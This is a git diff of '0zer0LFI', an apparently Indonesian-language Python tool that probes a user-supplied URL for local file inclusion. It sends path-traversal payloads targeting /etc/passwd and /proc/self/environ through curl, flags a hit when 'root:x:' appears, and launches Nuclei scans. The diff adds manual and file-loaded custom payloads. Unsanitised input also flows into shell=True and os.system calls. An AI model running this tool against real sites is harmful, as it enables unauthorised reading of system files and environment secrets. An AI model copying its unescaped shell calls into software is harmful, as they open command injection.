@@ -36,42 +36,51 @@ print(colored("✅ Access Granted!", 'green'))
 time.sleep(2)
 
 LFI_PAYLOADS = [
-    {
-        "payload": "../../../../../../etc/passwd",
-        "description": "Classic LFI"
-    },
-    {
-        "payload": "../../../../../../proc/self/environ",
-        "description": "Proc Self Environ"
-    }
+    "../../../../../../etc/passwd",
+    "../../../../../../proc/self/environ"
 ]
 
-def scan_lfi(url):
+def scan_lfi(url, custom_payloads=None):
+    """Scan LFI dengan payload default atau custom"""
     print(colored(f'🔍 Scanning {url} for LFI vulnerabilities...', 'yellow'))
 
-    for payload in LFI_PAYLOADS:
-        print(colored(f"[-] Testing {payload['description']}", 'cyan'))
-        command = f"curl -s '{url}?file={payload['payload']}'"
+    payloads = custom_payloads if custom_payloads else LFI_PAYLOADS
+
+    for payload in payloads:
+        print(colored(f"[-] Testing payload: {payload}", 'cyan'))
+        command = f"curl -s '{url}?file={payload}'"
 
         try:
             result = subprocess.run(command, shell=True, capture_output=True, text=True)
             if "root:x:" in result.stdout:
-                print(colored(f"[✅] Vulnerable with payload: {payload['payload']}", 'green'))
+                print(colored(f"[✅] Vulnerable with payload: {payload}", 'green'))
             else:
                 print(colored('[❌] Not Vulnerable', 'red'))
         except Exception as e:
             print(colored(f'[!] Error: {e}', 'red'))
 
 def scan_nuclei(url):
+    """Jalankan scan menggunakan Nuclei"""
     print(colored(f'🚀 Running Nuclei scan on {url}...', 'yellow'))
     os.system(f"nuclei -u {url}")
+
+def load_payloads_from_file(filename):
+    """Load payload dari file"""
+    if not os.path.exists(filename):
+        print(colored(f"❌ File {filename} not found!", 'red'))
+        return []
+
+    with open(filename, 'r') as file:
+        return [line.strip() for line in file.readlines() if line.strip()]
 
 def main():
     while True:
         os.system('clear')
         print(colored(pyfiglet.figlet_format('0zer0LFI', font='slant'), 'red'))
-        print(colored('1. Single URL Scan', 'yellow'))
-        print(colored('2. Run Nuclei Scan', 'yellow'))
+        print(colored('1. Single URL Scan (Default Payloads)', 'yellow'))
+        print(colored('2. Single URL Scan (Manual Payload)', 'yellow'))
+        print(colored('3. Single URL Scan (Load Payload from File)', 'yellow'))
+        print(colored('4. Run Nuclei Scan', 'yellow'))
         print(colored('0. Exit', 'yellow'))
 
         choice = input(colored('\n🤖 Pilih opsi: ', 'yellow'))
@@ -81,9 +90,22 @@ def main():
             scan_lfi(url)
         elif choice == '2':
             url = input(colored('🌐 Masukkan URL target: ', 'yellow'))
+            custom_payload = input(colored('📌 Masukkan payload LFI: ', 'yellow'))
+            scan_lfi(url, [custom_payload])
+        elif choice == '3':
+            url = input(colored('🌐 Masukkan URL target: ', 'yellow'))
+            file_path = input(colored('📂 Masukkan path file payloads: ', 'yellow'))
+            payloads = load_payloads_from_file(file_path)
+            if payloads:
+                scan_lfi(url, payloads)
+        elif choice == '4':
+            url = input(colored('🌐 Masukkan URL target: ', 'yellow'))
             scan_nuclei(url)
         elif choice == '0':
             break
+        else:
+            print(colored("❌ Invalid option. Try again.", 'red'))
+            time.sleep(2)
 
 if __name__ == '__main__':
     main()
